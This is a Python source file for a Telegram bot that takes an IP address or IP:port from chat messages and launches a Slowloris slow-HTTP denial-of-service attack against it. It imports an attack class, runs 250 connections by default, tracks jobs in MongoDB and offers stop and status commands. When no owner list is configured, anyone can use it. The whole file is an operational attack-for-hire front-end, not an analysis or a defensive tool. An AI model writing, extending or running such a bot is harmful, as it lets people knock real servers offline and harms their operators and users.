import logging
import os
import re

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

from attacker import SlowlorisAttack
from db import active_jobs, add_job, delete_stopped, heartbeat, mark_stopped, reset_stale

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_IDS = [int(x) for x in os.getenv("OWNER_IDS", "").split(",") if x.strip()]
DEFAULT_PORT = int(os.getenv("DEFAULT_PORT", "80"))
DEFAULT_CONN = int(os.getenv("DEFAULT_CONN", "250"))

IP_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")
IPPORT_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$")

attacks = {}  # chat_id -> SlowlorisAttack


def allowed(update: Update) -> bool:
    if not OWNER_IDS:
        return True
    return update.effective_user.id in OWNER_IDS


def valid_ip(ip: str) -> bool:
    if not IP_RE.match(ip):
        return False
    return all(0 <= int(part) <= 255 for part in ip.split("."))


def parse_target(text: str):
    text = text.strip().replace(" ", "")
    if IPPORT_RE.match(text):
        ip, port = text.rsplit(":", 1)
        return ip, int(port)
    if valid_ip(text):
        return text, DEFAULT_PORT
    return None, None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    await update.message.reply_text(
        "🤖 *Slow Bot*\n\n"
        "Send me a target IP address and I'll saturate it with slow HTTP connections.\n\n"
        "• `203.0.113.10` — uses default port 80\n"
        "• `203.0.113.10:443` — custom port\n\n"
        "Commands:\n"
        "`/stop` — halt the running attack\n"
        "`/status` — show all active attacks\n"
        "`/clean` — remove all stopped jobs",
        parse_mode="Markdown",
    )


async def handle_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")

    chat_id = update.effective_chat.id
    text = update.message.text.strip()

    ip, port = parse_target(text)
    if not ip:
        return await update.message.reply_text(
            "❌ That doesn't look like a valid IPv4 address. Try `203.0.113.10` or `203.0.113.10:8080`."
        )

    if chat_id in attacks and attacks[chat_id].is_running:
        return await update.message.reply_text("⚠️ An attack is already running for this chat. Use `/stop` first.")

    attack = SlowlorisAttack(
        target=ip,
        port=port,
        max_conn=DEFAULT_CONN,
        on_heartbeat=lambda c: heartbeat(chat_id, c),
    )
    attacks[chat_id] = attack
    add_job(chat_id, ip, port, DEFAULT_CONN)
    attack.start()

    kb = InlineKeyboardMarkup([[InlineKeyboardButton("⛔ Stop Attack", callback_data="stop")]])
    await update.message.reply_text(
        f"🚀 Attack started against `{ip}:{port}`\n"
        f"• Connections: `{DEFAULT_CONN}`\n"
        f"• Status: `running` (saved in MongoDB)\n\n"
        f"Press the button or send `/stop` when done.",
        parse_mode="Markdown",
        reply_markup=kb,
    )
    logger.info("Attack started by %s on %s:%s", update.effective_user.id, ip, port)


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    chat_id = update.effective_chat.id
    attack = attacks.get(chat_id)
    if not attack or not attack.is_running:
        return await update.message.reply_text("ℹ️ No running attack for this chat.")
    attack.stop()
    mark_stopped(chat_id)
    attacks.pop(chat_id, None)
    await update.message.reply_text("🛑 Attack stopped. All sockets closed.")


async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id
    attack = attacks.get(chat_id)
    if attack and attack.is_running:
        attack.stop()
        mark_stopped(chat_id)
        attacks.pop(chat_id, None)
        await query.edit_message_text("🛑 Attack stopped. All sockets closed.")
    else:
        await query.edit_message_text("ℹ️ No running attack.")


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    jobs = active_jobs()
    if not jobs:
        return await update.message.reply_text("ℹ️ No active attacks in MongoDB.")
    lines = ["📊 *Active attacks:*"]
    for j in jobs:
        lines.append(
            f"• `{j['target']}:{j['port']}` — {j.get('connections', 0)} conns, "
            f"started {j['started_at'].strftime('%H:%M UTC')}"
        )
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def clean_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    n = delete_stopped()
    await update.message.reply_text(f"🧹 Removed {n} stopped job(s).")


def main():
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN env var is required")
    reset_stale()  # mark leftover "running" jobs as stopped on restart
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("clean", clean_cmd))
    app.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ip))
    logger.info("Bot started, polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
